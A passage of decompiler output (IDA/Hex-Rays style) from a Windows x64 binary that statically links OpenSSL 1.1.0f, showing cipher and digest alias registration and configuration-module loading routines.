  return sub_140026520((unsigned int **)(a1 + 72), a2, a3);
}

//----- (000000014002DD40) ----------------------------------------------------
__int64 __fastcall sub_14002DD40(__int64 a1)
{
  int v1; // eax
  int v2; // eax
  unsigned int v4[2]; // [rsp+20h] [rbp-28h] BYREF
  char *v5; // [rsp+28h] [rbp-20h]
  char v6; // [rsp+50h] [rbp+8h] BYREF

  v1 = sub_140027260(*(_QWORD *)(a1 + 16));
  v4[1] = 2;
  v6 = -1;
  v4[0] = (v1 + 7) / 8;
  v5 = &v6;
  v2 = sub_140050050(v4, 0i64);
  return sub_140047960(1, 2 * v2, 16);
}

//----- (000000014002DDA0) ----------------------------------------------------
__int64 __fastcall sub_14002DDA0(unsigned int a1, int a2, __int64 a3)
{
  __int64 v6; // rbx
  __int64 v7; // rax
  unsigned int *v8; // rdi

  v6 = sub_140050B70((__int64)&unk_1400F37F0);
  if ( v6 )
  {
    *(_QWORD *)v6 = sub_14002C0F0(a1);
    v7 = sub_14004FF40();
    v8 = (unsigned int *)v7;
    if ( v7 && (unsigned int)sub_1400297C0(*(int **)(v6 + 8), v7) )
    {
      sub_14003F350((__int64)v8, a2, a3);
      return v6;
    }
    sub_140051250((unsigned int *)v6, (__int64)&unk_1400F37F0);
    sub_14004FF20(v8);
  }
  return 0i64;
}

//----- (000000014002DE40) ----------------------------------------------------
__int64 __fastcall sub_14002DE40(unsigned int *a1)
{
  return sub_140050AA0((__int64)&unk_1400F37F0, a1);
}

//----- (000000014002DE60) ----------------------------------------------------
void __fastcall sub_14002DE60(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_1400F37F0);
}

//----- (000000014002DE80) ----------------------------------------------------
void *sub_14002DE80()
{
  return &unk_1400F37F0;
}

//----- (000000014002DE90) ----------------------------------------------------
__int64 sub_14002DE90()
{
  return sub_140050B70((__int64)&unk_1400F37F0);
}

//----- (000000014002DEB0) ----------------------------------------------------
_BOOL8 sub_14002DEB0()
{
  unsigned int *v0; // rax
  unsigned int *v1; // rax
  unsigned int *v2; // rax
  unsigned int *v3; // rax
  unsigned int *v4; // rax
  unsigned int *v5; // rax
  unsigned int *v6; // rax
  unsigned int *v7; // rax
  unsigned int *v8; // rax
  unsigned int *v9; // rax
  unsigned int *v10; // rax
  unsigned int *v11; // rax
  unsigned int *v12; // rax
  unsigned int *v13; // rax
  unsigned int *v14; // rax
  unsigned int *v15; // rax
  unsigned int *v16; // rax
  unsigned int *v17; // rax
  unsigned int *v18; // rax
  unsigned int *v19; // rax
  unsigned int *v20; // rax
  unsigned int *v21; // rax
  unsigned int *v22; // rax
  unsigned int *v23; // rax
  unsigned int *v24; // rax
  unsigned int *v25; // rax
  unsigned int *v26; // rax
  unsigned int *v27; // rax
  unsigned int *v28; // rax
  unsigned int *v29; // rax
  unsigned int *v30; // rax
  unsigned int *v31; // rax
  unsigned int *v32; // rax
  unsigned int *v33; // rax
  unsigned int *v34; // rax
  unsigned int *v35; // rax
  unsigned int *v36; // rax
  unsigned int *v37; // rax
  unsigned int *v38; // rax
  unsigned int *v39; // rax
  unsigned int *v40; // rax
  unsigned int *v41; // rax
  unsigned int *v42; // rax
  unsigned int *v43; // rax
  unsigned int *v44; // rax
  unsigned int *v45; // rax
  unsigned int *v46; // rax
  unsigned int *v47; // rax
  unsigned int *v48; // rax
  unsigned int *v49; // rax
  unsigned int *v50; // rax
  unsigned int *v51; // rax
  unsigned int *v52; // rax
  unsigned int *v53; // rax
  unsigned int *v54; // rax
  unsigned int *v55; // rax
  unsigned int *v56; // rax
  unsigned int *v57; // rax
  unsigned int *v58; // rax
  unsigned int *v59; // rax
  unsigned int *v60; // rax
  unsigned int *v61; // rax
  unsigned int *v62; // rax
  unsigned int *v63; // rax
  unsigned int *v64; // rax
  unsigned int *v65; // rax
  unsigned int *v66; // rax
  unsigned int *v67; // rax
  unsigned int *v68; // rax
  unsigned int *v69; // rax
  unsigned int *v70; // rax
  unsigned int *v71; // rax
  unsigned int *v72; // rax
  unsigned int *v73; // rax
  unsigned int *v74; // rax
  unsigned int *v75; // rax
  unsigned int *v76; // rax
  unsigned int *v77; // rax
  unsigned int *v78; // rax
  unsigned int *v79; // rax
  unsigned int *v80; // rax
  struct _exception *v81; // rcx
  unsigned int *v82; // rax
  struct _exception *v83; // rcx
  unsigned int *v84; // rax
  struct _exception *v85; // rcx
  unsigned int *v86; // rax
  struct _exception *v87; // rcx
  unsigned int *v88; // rax
  unsigned int *v89; // rax
  unsigned int *v90; // rax
  unsigned int *v91; // rax
  unsigned int *v92; // rax
  unsigned int *v93; // rax
  unsigned int *v94; // rax
  unsigned int *v95; // rax
  unsigned int *v96; // rax
  unsigned int *v97; // rax
  unsigned int *v98; // rax
  unsigned int *v99; // rax
  unsigned int *v100; // rax
  unsigned int *v101; // rax
  unsigned int *v102; // rax
  unsigned int *v103; // rax
  unsigned int *v104; // rax
  unsigned int *v105; // rax
  unsigned int *v106; // rax
  unsigned int *v107; // rax
  unsigned int *v108; // rax
  unsigned int *v109; // rax
  unsigned int *v110; // rax
  unsigned int *v111; // rax

  v0 = (unsigned int *)sub_140054880();
  sub_14001E840(v0);
  v1 = (unsigned int *)sub_140054870();
  sub_14001E840(v1);
  v2 = (unsigned int *)sub_140054890();
  sub_14001E840(v2);
  v3 = (unsigned int *)sub_140055460();
  sub_14001E840(v3);
  v4 = (unsigned int *)sub_140055410();
  sub_14001E840(v4);
  v5 = (unsigned int *)sub_140055400();
  sub_14001E840(v5);
  v6 = (unsigned int *)sub_140055420();
  sub_14001E840(v6);
  v7 = (unsigned int *)sub_1400548B0();
  sub_14001E840(v7);
  v8 = (unsigned int *)sub_140055470();
  sub_14001E840(v8);
  v9 = (unsigned int *)sub_140055430();
  sub_14001E840(v9);
  v10 = (unsigned int *)sub_1400559B0();
  sub_14001E840(v10);
  sub_1400358A0((__int64)"DESX", 32770, (__int64)"DESX-CBC");
  sub_1400358A0((__int64)"desx", 32770, (__int64)"DESX-CBC");
  v11 = (unsigned int *)sub_140054860();
  sub_14001E840(v11);
  sub_1400358A0((__int64)"DES", 32770, (__int64)"DES-CBC");
  sub_1400358A0((__int64)"des", 32770, (__int64)"DES-CBC");
  v12 = (unsigned int *)sub_140055450();
  sub_14001E840(v12);
  v13 = (unsigned int *)sub_1400553F0();
  sub_14001E840(v13);
  sub_1400358A0((__int64)"DES3", 32770, (__int64)"DES-EDE3-CBC");
  sub_1400358A0((__int64)"des3", 32770, (__int64)"DES-EDE3-CBC");
  v14 = (unsigned int *)sub_1400548A0();
  sub_14001E840(v14);
  v15 = (unsigned int *)sub_1400553D0();
  sub_14001E840(v15);
  sub_1400358A0((__int64)"DES-EDE-ECB", 32770, (__int64)"DES-EDE");
  sub_1400358A0((__int64)"des-ede-ecb", 32770, (__int64)"DES-EDE");
  v16 = (unsigned int *)sub_1400553E0();
  sub_14001E840(v16);
  sub_1400358A0((__int64)"DES-EDE3-ECB", 32770, (__int64)"DES-EDE3");
  sub_1400358A0((__int64)"des-ede3-ecb", 32770, (__int64)"DES-EDE3");
  v17 = (unsigned int *)sub_140055440();
  sub_14001E840(v17);
  sub_1400358A0((__int64)"des3-wrap", 32770, (__int64)"id-smime-alg-CMS3DESwrap");
  v18 = (unsigned int *)sub_140055A60();
  sub_14001E840(v18);
  v19 = (unsigned int *)sub_140055A70();
  sub_14001E840(v19);
  v20 = (unsigned int *)sub_140056030();
  sub_14001E840(v20);
  v21 = (unsigned int *)sub_1400564D0();
  sub_14001E840(v21);
  v22 = (unsigned int *)sub_1400564C0();
  sub_14001E840(v22);
  v23 = (unsigned int *)sub_1400564E0();
  sub_14001E840(v23);
  v24 = (unsigned int *)sub_1400564B0();
  sub_14001E840(v24);
  sub_1400358A0((__int64)"IDEA", 32770, (__int64)"IDEA-CBC");
  sub_1400358A0((__int64)"idea", 32770, (__int64)"IDEA-CBC");
  v25 = (unsigned int *)sub_14005B290();
  sub_14001E840(v25);
  v26 = (unsigned int *)sub_14005B280();
  sub_14001E840(v26);
  v27 = (unsigned int *)sub_14005B2A0();
  sub_14001E840(v27);
  v28 = (unsigned int *)sub_14005B270();
  sub_14001E840(v28);
  sub_1400358A0((__int64)"SEED", 32770, (__int64)"SEED-CBC");
  sub_1400358A0((__int64)"seed", 32770, (__int64)"SEED-CBC");
  v29 = (unsigned int *)sub_140056BE0();
  sub_14001E840(v29);
  v30 = (unsigned int *)sub_140056BD0();
  sub_14001E840(v30);
  v31 = (unsigned int *)sub_140056BF0();
  sub_14001E840(v31);
  v32 = (unsigned int *)sub_140056BC0();
  sub_14001E840(v32);
  v33 = (unsigned int *)sub_140056BA0();
  sub_14001E840(v33);
  v34 = (unsigned int *)sub_140056BB0();
  sub_14001E840(v34);
  sub_1400358A0((__int64)"RC2", 32770, (__int64)"RC2-CBC");
  sub_1400358A0((__int64)"rc2", 32770, (__int64)"RC2-CBC");
  sub_1400358A0((__int64)"rc2-128", 32770, (__int64)"RC2-CBC");
  sub_1400358A0((__int64)"rc2-64", 32770, (__int64)"RC2-64-CBC");
  sub_1400358A0((__int64)"rc2-40", 32770, (__int64)"RC2-40-CBC");
  v35 = (unsigned int *)sub_140057030();
  sub_14001E840(v35);
  v36 = (unsigned int *)sub_140057020();
  sub_14001E840(v36);
  v37 = (unsigned int *)sub_140057040();
  sub_14001E840(v37);
  v38 = (unsigned int *)sub_140057010();
  sub_14001E840(v38);
  sub_1400358A0((__int64)"BF", 32770, (__int64)"BF-CBC");
  sub_1400358A0((__int64)"bf", 32770, (__int64)"BF-CBC");
  sub_1400358A0((__int64)"blowfish", 32770, (__int64)"BF-CBC");
  v39 = (unsigned int *)sub_140057480();
  sub_14001E840(v39);
  v40 = (unsigned int *)sub_140057470();
  sub_14001E840(v40);
  v41 = (unsigned int *)sub_140057490();
  sub_14001E840(v41);
  v42 = (unsigned int *)sub_140057460();
  sub_14001E840(v42);
  sub_1400358A0((__int64)"CAST", 32770, (__int64)"CAST5-CBC");
  sub_1400358A0((__int64)"cast", 32770, (__int64)"CAST5-CBC");
  sub_1400358A0((__int64)"CAST-cbc", 32770, (__int64)"CAST5-CBC");
  sub_1400358A0((__int64)"cast-cbc", 32770, (__int64)"CAST5-CBC");
  v43 = (unsigned int *)sub_1400595A0();
  sub_14001E840(v43);
  v44 = (unsigned int *)sub_140059540();
  sub_14001E840(v44);
  v45 = (unsigned int *)sub_140059570();
  sub_14001E840(v45);
  v46 = (unsigned int *)sub_140059560();
  sub_14001E840(v46);
  v47 = (unsigned int *)sub_140059580();
  sub_14001E840(v47);
  v48 = (unsigned int *)sub_1400595D0();
  sub_14001E840(v48);
  v49 = (unsigned int *)sub_140059590();
  sub_14001E840(v49);
  v50 = (unsigned int *)sub_1400595B0();
  sub_14001E840(v50);
  v51 = (unsigned int *)sub_1400595C0();
  sub_14001E840(v51);
  v52 = (unsigned int *)sub_140059600();
  sub_14001E840(v52);
  v53 = (unsigned int *)sub_140059550();
  sub_14001E840(v53);
  v54 = (unsigned int *)sub_1400595E0();
  sub_14001E840(v54);
  sub_1400358A0((__int64)"aes128-wrap", 32770, (__int64)"id-aes128-wrap");
  v55 = (unsigned int *)sub_1400595F0();
  sub_14001E840(v55);
  sub_1400358A0((__int64)"AES128", 32770, (__int64)"AES-128-CBC");
  sub_1400358A0((__int64)"aes128", 32770, (__int64)"AES-128-CBC");
  v56 = (unsigned int *)sub_140059670();
  sub_14001E840(v56);
  v57 = (unsigned int *)sub_140059610();
  sub_14001E840(v57);
  v58 = (unsigned int *)sub_140059640();
  sub_14001E840(v58);
  v59 = (unsigned int *)sub_140059630();
  sub_14001E840(v59);
  v60 = (unsigned int *)sub_140059650();
  sub_14001E840(v60);
  v61 = (unsigned int *)sub_1400596A0();
  sub_14001E840(v61);
  v62 = (unsigned int *)sub_140059660();
  sub_14001E840(v62);
  v63 = (unsigned int *)sub_140059680();
  sub_14001E840(v63);
  v64 = (unsigned int *)sub_140059690();
  sub_14001E840(v64);
  v65 = (unsigned int *)sub_140059620();
  sub_14001E840(v65);
  v66 = (unsigned int *)sub_1400596B0();
  sub_14001E840(v66);
  sub_1400358A0((__int64)"aes192-wrap", 32770, (__int64)"id-aes192-wrap");
  v67 = (unsigned int *)sub_1400596C0();
  sub_14001E840(v67);
  sub_1400358A0((__int64)"AES192", 32770, (__int64)"AES-192-CBC");
  sub_1400358A0((__int64)"aes192", 32770, (__int64)"AES-192-CBC");
  v68 = (unsigned int *)sub_140059730();
  sub_14001E840(v68);
  v69 = (unsigned int *)sub_1400596D0();
  sub_14001E840(v69);
  v70 = (unsigned int *)sub_140059700();
  sub_14001E840(v70);
  v71 = (unsigned int *)sub_1400596F0();
  sub_14001E840(v71);
  v72 = (unsigned int *)sub_140059710();
  sub_14001E840(v72);
  v73 = (unsigned int *)sub_140059760();
  sub_14001E840(v73);
  v74 = (unsigned int *)sub_140059720();
  sub_14001E840(v74);
  v75 = (unsigned int *)sub_140059740();
  sub_14001E840(v75);
  v76 = (unsigned int *)sub_140059750();
  sub_14001E840(v76);
  v77 = (unsigned int *)sub_140059790();
  sub_14001E840(v77);
  v78 = (unsigned int *)sub_1400596E0();
  sub_14001E840(v78);
  v79 = (unsigned int *)sub_140059770();
  sub_14001E840(v79);
  sub_1400358A0((__int64)"aes256-wrap", 32770, (__int64)"id-aes256-wrap");
  v80 = (unsigned int *)sub_140059780();
  sub_14001E840(v80);
  sub_1400358A0((__int64)"AES256", 32770, (__int64)"AES-256-CBC");
  sub_1400358A0((__int64)"aes256", 32770, (__int64)"AES-256-CBC");
  v82 = (unsigned int *)UserMathErrorFunction(v81);
  sub_14001E840(v82);
  v84 = (unsigned int *)UserMathErrorFunction(v83);
  sub_14001E840(v84);
  v86 = (unsigned int *)UserMathErrorFunction(v85);
  sub_14001E840(v86);
  v88 = (unsigned int *)UserMathErrorFunction(v87);
  sub_14001E840(v88);
  v89 = (unsigned int *)sub_14005A290();
  sub_14001E840(v89);
  v90 = (unsigned int *)sub_14005A240();
  sub_14001E840(v90);
  v91 = (unsigned int *)sub_14005A260();
  sub_14001E840(v91);
  v92 = (unsigned int *)sub_14005A250();
  sub_14001E840(v92);
  v93 = (unsigned int *)sub_14005A270();
  sub_14001E840(v93);
  v94 = (unsigned int *)sub_14005A2A0();
  sub_14001E840(v94);
  sub_1400358A0((__int64)"CAMELLIA128", 32770, (__int64)"CAMELLIA-128-CBC");
  sub_1400358A0((__int64)"camellia128", 32770, (__int64)"CAMELLIA-128-CBC");
  v95 = (unsigned int *)sub_14005A300();
  sub_14001E840(v95);
  v96 = (unsigned int *)sub_14005A2B0();
  sub_14001E840(v96);
  v97 = (unsigned int *)sub_14005A2D0();
  sub_14001E840(v97);
  v98 = (unsigned int *)sub_14005A2C0();
  sub_14001E840(v98);
  v99 = (unsigned int *)sub_14005A2E0();
  sub_14001E840(v99);
  v100 = (unsigned int *)sub_14005A310();
  sub_14001E840(v100);
  sub_1400358A0((__int64)"CAMELLIA192", 32770, (__int64)"CAMELLIA-192-CBC");
  sub_1400358A0((__int64)"camellia192", 32770, (__int64)"CAMELLIA-192-CBC");
  v101 = (unsigned int *)sub_14005A370();
  sub_14001E840(v101);
  v102 = (unsigned int *)sub_14005A320();
  sub_14001E840(v102);
  v103 = (unsigned int *)sub_14005A340();
  sub_14001E840(v103);
  v104 = (unsigned int *)sub_14005A330();
  sub_14001E840(v104);
  v105 = (unsigned int *)sub_14005A350();
  sub_14001E840(v105);
  v106 = (unsigned int *)sub_14005A380();
  sub_14001E840(v106);
  sub_1400358A0((__int64)"CAMELLIA256", 32770, (__int64)"CAMELLIA-256-CBC");
  sub_1400358A0((__int64)"camellia256", 32770, (__int64)"CAMELLIA-256-CBC");
  v107 = (unsigned int *)sub_14005A280();
  sub_14001E840(v107);
  v108 = (unsigned int *)sub_14005A2F0();
  sub_14001E840(v108);
  v109 = (unsigned int *)sub_14005A360();
  sub_14001E840(v109);
  v110 = (unsigned int *)sub_14005AE60();
  sub_14001E840(v110);
  v111 = (unsigned int *)sub_14005AE70();
  return sub_14001E840(v111);
}
// 14002E63A: variable 'v81' is possibly undefined
// 14002E647: variable 'v83' is possibly undefined
// 14002E654: variable 'v85' is possibly undefined
// 14002E661: variable 'v87' is possibly undefined

//----- (000000014002E830) ----------------------------------------------------
_BOOL8 sub_14002E830()
{
  unsigned int *v0; // rax
  unsigned int *v1; // rax
  unsigned int *v2; // rax
  unsigned int *v3; // rax
  unsigned int *v4; // rax
  unsigned int *v5; // rax
  unsigned int *v6; // rax
  unsigned int *v7; // rax
  unsigned int *v8; // rax
  unsigned int *v9; // rax
  unsigned int *v10; // rax
  unsigned int *v11; // rax
  unsigned int *v12; // rax

  v0 = (unsigned int *)sub_14005B340();
  sub_14001E8A0(v0);
  v1 = (unsigned int *)sub_14005B3C0();
  sub_14001E8A0(v1);
  sub_1400358A0((__int64)"ssl3-md5", 32769, (__int64)"MD5");
  v2 = (unsigned int *)sub_14005B6B0();
  sub_14001E8A0(v2);
  v3 = (unsigned int *)sub_14005BAC0();
  sub_14001E8A0(v3);
  sub_1400358A0((__int64)"ssl3-sha1", 32769, (__int64)"SHA1");
  sub_1400358A0((__int64)"RSA-SHA1-2", 32769, (__int64)"RSA-SHA1");
  v4 = (unsigned int *)sub_14005BBA0();
  sub_14001E8A0(v4);
  v5 = (unsigned int *)sub_14005BC20();
  sub_14001E8A0(v5);
  sub_1400358A0((__int64)"ripemd", 32769, (__int64)"RIPEMD160");
  sub_1400358A0((__int64)"rmd160", 32769, (__int64)"RIPEMD160");
  v6 = (unsigned int *)sub_14005BAD0();
  sub_14001E8A0(v6);
  v7 = (unsigned int *)sub_14005BAE0();
  sub_14001E8A0(v7);
  v8 = (unsigned int *)sub_14005BAF0();
  sub_14001E8A0(v8);
  v9 = (unsigned int *)sub_14005BB00();
  sub_14001E8A0(v9);
  v10 = (unsigned int *)sub_14005BCC0();
  sub_14001E8A0(v10);
  v11 = (unsigned int *)sub_14005B750();
  sub_14001E8A0(v11);
  v12 = (unsigned int *)sub_14005B7F0();
  return sub_14001E8A0(v12);
}

//----- (000000014002E970) ----------------------------------------------------
__int64 __fastcall sub_14002E970(char *a1)
{
  __int64 result; // rax

  if ( !dword_140142BB0 )
  {
    sub_14005BCD0();
    sub_14005BD00();
    sub_140023B90();
    result = sub_14002ECD0(0i64, a1, 48);
    dword_140142BB0 = 1;
  }
  return result;
}
// 140142BB0: using guessed type int dword_140142BB0;

//----- (000000014002E9C0) ----------------------------------------------------
void sub_14002E9C0()
{
  dword_140142BB0 = 1;
}
// 140142BB0: using guessed type int dword_140142BB0;

//----- (000000014002E9D0) ----------------------------------------------------
_BYTE *sub_14002E9D0()
{
  _BYTE *v0; // rax
  _BYTE *result; // rax
  const char *v2; // rax
  unsigned int v3; // edx
  unsigned int i; // ecx
  int v5; // ecx
  const char *v6; // rax
  size_t v7; // rdi
  _BYTE *v8; // rbx
  char *v9; // rax

  v0 = (_BYTE *)common_getenv<char>("OPENSSL_CONF");
  if ( v0 )
    return sub_14003BB60(v0);
  v2 = sub_14005C160();
  v3 = 0;
  for ( i = 0; *v2; ++i )
  {
    if ( i >= 0x80000000 )
      break;
    ++v2;
  }
  v5 = i & 0x7FFFFFFF;
  v6 = "openssl.cnf";
  do
  {
    if ( v3 >= 0x80000000 )
      break;
    ++v6;
    ++v3;
  }
  while ( *v6 );
  v7 = (int)((v3 & 0x7FFFFFFF) + v5 + 2);
  result = sub_14001D8E0(v7);
  v8 = result;
  if ( result )
  {
    v9 = (char *)sub_14005C160();
    sub_14003C060(v8, v9, v7);
    sub_14003BFE0(v8, "/", v7);
    sub_14003BFE0(v8, "openssl.cnf", v7);
    return v8;
  }
  return result;
}

//----- (000000014002EAE0) ----------------------------------------------------
_BOOL8 __fastcall sub_14002EAE0(_BYTE *a1, __int64 a2, __int64 a3)
{
  return sub_14002F010(0i64, a1, a2, a3) != 0i64;
}

//----- (000000014002EB10) ----------------------------------------------------
void sub_14002EB10()
{
  __int64 v0; // rax
  void **v1; // rbx
  void (__fastcall *v2)(__int64); // rdx

  while ( (int)sub_1400296E0((unsigned int *)qword_140142BC0) > 0 )
  {
    v0 = sub_1400296F0((int *)qword_140142BC0);
    v1 = (void **)v0;
    if ( v0 )
    {
      v2 = *(void (__fastcall **)(__int64))(*(_QWORD *)v0 + 24i64);
      if ( v2 )
        v2(v0);
      --*((_DWORD *)*v1 + 8);
      sub_14001D930(v1[1]);
      sub_14001D930(v1[2]);
      sub_14001D930(v1);
    }
  }
  sub_1400294B0((void **)qword_140142BC0);
  qword_140142BC0 = 0i64;
}
// 140142BC0: using guessed type __int64 qword_140142BC0;

//----- (000000014002EBE0) ----------------------------------------------------
__int64 __fastcall sub_14002EBE0(__int64 a1, char *a2, char a3)
{
  __int64 v5; // rax
  __int64 result; // rax
  unsigned int *v7; // rdi
  int v8; // ebx
  __int64 v9; // rax

  if ( !a1 )
    return 1i64;
  if ( a2 )
  {
    v5 = sub_14005C010(a1, 0i64, a2);
    if ( v5 )
      goto LABEL_8;
    if ( (a3 & 0x20) == 0 )
    {
LABEL_6:
      sub_140023B90();
      return 1i64;
    }
  }
  v5 = sub_14005C010(a1, 0i64, "openssl_conf");
  if ( !v5 )
    goto LABEL_6;
LABEL_8:
  result = sub_14005BFA0(a1, v5);
  v7 = (unsigned int *)result;
  if ( result )
  {
    v8 = 0;
    if ( (int)sub_1400296E0((unsigned int *)result) <= 0 )
    {
      return 1i64;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880((__int64)v7, v8);
        result = sub_14002F490(a1, *(char **)(v9 + 8), *(char **)(v9 + 16), a3);
        if ( (int)result <= 0 && (a3 & 1) == 0 )
          break;
        if ( ++v8 >= (int)sub_1400296E0(v7) )
          return 1i64;
      }
    }
  }
  return result;
}

//----- (000000014002ECD0) ----------------------------------------------------
__int64 __fastcall sub_14002ECD0(_BYTE *a1, char *a2, char a3)
{
  _BYTE *v4; // rbx
  unsigned int v5; // esi
  __int64 v8; // rbp

  v4 = 0i64;
  v5 = 0;
  v8 = sub_14005C110(0i64);
  if ( v8 )
  {
    if ( a1 )
    {
      v4 = a1;
    }
    else
    {
      v4 = sub_14002E9D0();
      if ( !v4 )
      {
LABEL_12:
        sub_14001D930(v4);
        goto LABEL_13;
      }
    }
    if ( (int)sub_14005C0C0(v8) > 0 )
    {
      v5 = sub_14002EBE0(v8, a2, a3);
    }
    else if ( (a3 & 0x10) != 0 && (sub_1400244B0() & 0xFFF) == 114 )
    {
      sub_140023B90();
      v5 = 1;
    }
  }
  if ( !a1 )
    goto LABEL_12;
LABEL_13:
  sub_14005BEC0(v8);
  return v5;
}

//----- (000000014002EDB0) ----------------------------------------------------
void __fastcall sub_14002EDB0(int a1)
{
  int i; // ebx
  __int64 v3; // rax
  void **v4; // rdi

  sub_14002EB10();
  for ( i = sub_1400296E0((unsigned int *)qword_140142BB8) - 1; i >= 0; --i )
  {
    v3 = sub_140029880(qword_140142BB8, i);
    v4 = (void **)v3;
    if ( *(int *)(v3 + 32) <= 0 && *(_QWORD *)v3 || a1 )
    {
      sub_140029370((int *)qword_140142BB8, i);
      sub_1400352F0(*v4);
      sub_14001D930(v4[1]);
      sub_14001D930(v4);
    }
  }
  if ( !(unsigned int)sub_1400296E0((unsigned int *)qword_140142BB8) )
  {
    sub_1400294B0((void **)qword_140142BB8);
    qword_140142BB8 = 0i64;
  }
}
// 140142BB8: using guessed type __int64 qword_140142BB8;

//----- (000000014002EEA0) ----------------------------------------------------
__int64 __fastcall sub_14002EEA0(
        const char *a1,
        int a2,
        int a3,
        __int64 (__fastcall *a4)(const char *, __int64, __int64),
        __int64 a5)
{
  int v5; // eax
  const char *v9; // rbx
  __int64 result; // rax
  unsigned __int8 i; // al
  char *v12; // rax
  char *v13; // rsi
  char *v14; // rdi
  const char *v15; // rcx
  __int64 v16; // rax
  int v17; // ecx
  const char *v18; // rcx
  __int64 v19; // rdx

  v9 = a1;
  if ( a1 )
  {
    while ( 1 )
    {
      if ( a3 )
      {
        for ( i = *v9; i; i = *++v9 )
        {
          if ( !isspace(i) )
            break;
        }
      }
      v12 = strchr(v9, a2);
      v13 = v12;
      if ( v12 == v9 || !*v9 )
      {
        v19 = 0i64;
        v18 = 0i64;
      }
      else
      {
        if ( v12 )
        {
          v14 = v12 - 1;
        }
        else
        {
          v15 = v9;
          v16 = 0i64;
          do
          {
            if ( (unsigned int)v16 >= 0x80000000 )
              break;
            ++v15;
            v16 = (unsigned int)(v16 + 1);
          }
          while ( *v15 );
          LODWORD(v16) = v16 & 0x7FFFFFFF;
          v14 = (char *)&v9[v16 - 1];
        }
        if ( a3 && isspace((unsigned __int8)*v14) )
        {
          do
            v17 = (unsigned __int8)*--v14;
          while ( isspace(v17) );
        }
        v18 = v9;
        v19 = (unsigned int)((_DWORD)v14 - (_DWORD)v9 + 1);
      }
      result = a4(v18, v19, a5);
      if ( (int)result <= 0 )
        break;
      if ( !v13 )
        return 1i64;
      v9 = v13 + 1;
    }
  }
  else
  {
    sub_140024610(v5 - 34, v5 + 71, v5 + 67, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_mod.c", 519);
    return 0i64;
  }
  return result;
}
// 14002EEDA: variable 'v5' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002EFF0) ----------------------------------------------------
void sub_14002EFF0()
{
  sub_14002EB10();
  sub_14002EDB0(1);
}

//----- (000000014002F010) ----------------------------------------------------
_QWORD *__fastcall sub_14002F010(__int64 a1, _BYTE *a2, __int64 a3, __int64 a4)
{
  _QWORD *result; // rax
  _QWORD *v9; // rax
  __int64 v10; // rbx
  void *v11; // rax

  if ( qword_140142BB8 || (result = sub_1400296C0(), (qword_140142BB8 = (__int64)result) != 0) )
  {
    v9 = sub_14001DC20(0x30ui64);
    v10 = (__int64)v9;
    if ( !v9 )
      return 0i64;
    *v9 = a1;
    v11 = sub_14003BB60(a2);
    *(_QWORD *)(v10 + 8) = v11;
    *(_QWORD *)(v10 + 16) = a3;
    *(_QWORD *)(v10 + 24) = a4;
    if ( !v11 )
    {
LABEL_7:
      sub_14001D930((void *)v10);
      return 0i64;
    }
    if ( !(unsigned int)sub_1400297C0((int *)qword_140142BB8, v10) )
    {
      sub_14001D930(*(void **)(v10 + 8));
      goto LABEL_7;
    }
    return (_QWORD *)v10;
  }
  return result;
}
// 140142BB8: using guessed type __int64 qword_140142BB8;

//----- (000000014002F110) ----------------------------------------------------
__int64 __fastcall sub_14002F110(const char *a1)
{
  int v1; // eax
  char *v3; // rax
  int v4; // ebx
  int v5; // edi
  unsigned int v6; // eax
  const char *i; // rcx
  size_t v8; // rbp
  __int64 v9; // rdi

  v3 = strrchr(a1, v1 + 14);
  v4 = 0;
  if ( v3 )
  {
    v5 = (_DWORD)v3 - (_DWORD)a1;
  }
  else
  {
    v6 = 0;
    for ( i = a1; *i; ++v6 )
    {
      if ( v6 >= 0x80000000 )
        break;
      ++i;
    }
    v5 = v6 & 0x7FFFFFFF;
  }
  if ( (int)sub_1400296E0((unsigned int *)qword_140142BB8) <= 0 )
    return 0i64;
  v8 = v5;
  while ( 1 )
  {
    v9 = sub_140029880(qword_140142BB8, v4);
    if ( !strncmp(*(const char **)(v9 + 8), a1, v8) )
      break;
    if ( ++v4 >= (int)sub_1400296E0((unsigned int *)qword_140142BB8) )
      return 0i64;
  }
  return v9;
}
// 14002F128: variable 'v1' is possibly undefined
// 140142BB8: using guessed type __int64 qword_140142BB8;

//----- (000000014002F1E0) ----------------------------------------------------
__int64 __fastcall sub_14002F1E0(__int64 a1, _BYTE *a2, _BYTE *a3, __int64 a4)
{
  int v4; // eax
  int v6; // esi
  int v10; // ebp
  _QWORD *v11; // rax
  __int64 v12; // rbx
  void *v13; // rax
  __int64 (__fastcall *v14)(__int64, __int64); // rax
  int *v15; // rax
  void (__fastcall *v16)(__int64); // rax

  v6 = v4 - 47;
  v10 = 0;
  v11 = sub_14001D8E0((unsigned int)(v4 - 8));
  v12 = (__int64)v11;
  if ( !v11 )
  {
LABEL_9:
    v16 = *(void (__fastcall **)(__int64))(a1 + 24);
    if ( v16 && v10 )
      v16(v12);
    goto LABEL_12;
  }
  *v11 = a1;
  v11[1] = sub_14003BB60(a2);
  v13 = sub_14003BB60(a3);
  *(_QWORD *)(v12 + 16) = v13;
  *(_QWORD *)(v12 + 32) = 0i64;
  if ( *(_QWORD *)(v12 + 8) && v13 )
  {
    v14 = *(__int64 (__fastcall **)(__int64, __int64))(a1 + 16);
    if ( !v14 || (v6 = v14(v12, a4), v10 = 1, v6 > 0) )
    {
      v15 = (int *)qword_140142BC0;
      if ( qword_140142BC0 || (v15 = (int *)sub_1400296C0(), (qword_140142BC0 = (__int64)v15) != 0) )
      {
        if ( (unsigned int)sub_1400297C0(v15, v12) )
        {
          ++*(_DWORD *)(a1 + 32);
          return (unsigned int)v6;
        }
        sub_140024610(14, 115, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_mod.c", 323);
      }
      else
      {
        sub_140024610(14, 115, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_mod.c", 317);
      }
    }
    goto LABEL_9;
  }
LABEL_12:
  if ( v12 )
  {
    sub_14001D930(*(void **)(v12 + 8));
    sub_14001D930(*(void **)(v12 + 16));
    sub_14001D930((void *)v12);
  }
  return 0xFFFFFFFFi64;
}
// 14002F20A: variable 'v4' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142BC0: using guessed type __int64 qword_140142BC0;

//----- (000000014002F380) ----------------------------------------------------
